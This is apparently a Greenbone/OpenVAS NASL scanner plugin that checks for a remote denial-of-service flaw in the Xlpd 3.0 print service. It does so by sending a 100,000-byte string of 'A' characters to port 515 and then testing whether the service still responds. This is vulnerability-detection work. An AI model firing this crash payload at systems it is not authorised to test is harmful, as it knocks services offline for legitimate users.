# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100296");
  script_version("2025-01-22T05:38:11+0000");
  script_tag(name:"last_modification", value:"2025-01-22 05:38:11 +0000 (Wed, 22 Jan 2025)");
  script_tag(name:"creation_date", value:"2009-10-08 20:03:34 +0200 (Thu, 08 Oct 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Xlpd 3.0 Remote DoS Vulnerability");
  script_category(ACT_DENIAL);
  script_family("Denial of Service");
  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_dependencies("find_service.nasl", "find_service1.nasl", "find_service2.nasl");
  script_require_ports("Services/lpd", 515);

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/36610");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/507029");

  script_tag(name:"summary", value:"Xlpd is prone to a denial of service (DoS) vulnerability because
  it fails to adequately validate user-supplied input.");

  script_tag(name:"vuldetect", value:"Sends a crafted LPD request and checks if the service is still
  responding.");

  script_tag(name:"impact", value:"An attacker can exploit this issue to crash the affected
  application, denying service to legitimate users. Given the nature of this issue, the attacker may
  also be able to run arbitrary code, but this has not been confirmed.");

  script_tag(name:"affected", value:"Xlpd 3.0 is vulnerable. Other versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("port_service_func.inc");

port = service_get_port(default:515, proto:"lpd");

if(!soc = open_sock_tcp(port))
  exit(0);

req = crap(data:raw_string(0x41), length:100000);
send(socket:soc, data:req);
close(soc);

sleep(2);

soc1 = open_sock_tcp(port);
if(!soc1) {
  security_message(port:port);
  exit(0);
} else {
  close(soc1);
}

exit(0);
